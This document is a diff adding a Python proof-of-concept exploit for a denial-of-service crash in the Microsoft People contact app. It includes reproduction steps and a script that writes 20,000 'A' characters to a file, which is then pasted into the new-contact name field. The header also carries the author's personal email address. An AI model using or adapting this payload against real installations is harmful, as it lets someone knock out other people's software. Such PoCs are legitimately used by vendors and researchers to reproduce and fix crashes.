@@ -1,0 +1,36 @@
+# Exploit Title: Microsoft people 10.1807.2131.0 - Denial of service (PoC)
+# Exploit Author : L0RD
+# Contact: borna.nematzadeh123@gmail.com
+# Date: 2018-09-04
+# Vendor Homepage : https://www.microsoft.com
+# Software link: https://www.microsoft.com/en-us/p/microsoft-people/9nblggh10pg8?activetab=pivot:overviewtab
+# Version: <= 10.1807.2131.0
+# Tested on: Windows 10
+# CVE: N/A
+
+# Description:
+# Microsoft people desktop application is a contact management app and
+# address book included in Microsoft's Windows 8 and 10.
+# It allows a user to organize and link contacts from different email
+# accounts with a unique graphical interface
+# More information :
+# https://support.microsoft.com/en-us/help/14103/windows-people-app-help
+
+# Steps to reproduce:
+# 1) Run the python exploit code and copy content of file.
+# 2) Open people application
+# 3) Click on "new contact (+)" and paste content of "poc.txt" into name filed and save contact
+# 4) Crash!
+
+#!/usr/bin/python
+
+buffer = "\x41" * 20000
+payload = buffer
+try:
+    f=open("poc.txt","w")
+    print "[+] Creating %s bytes payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
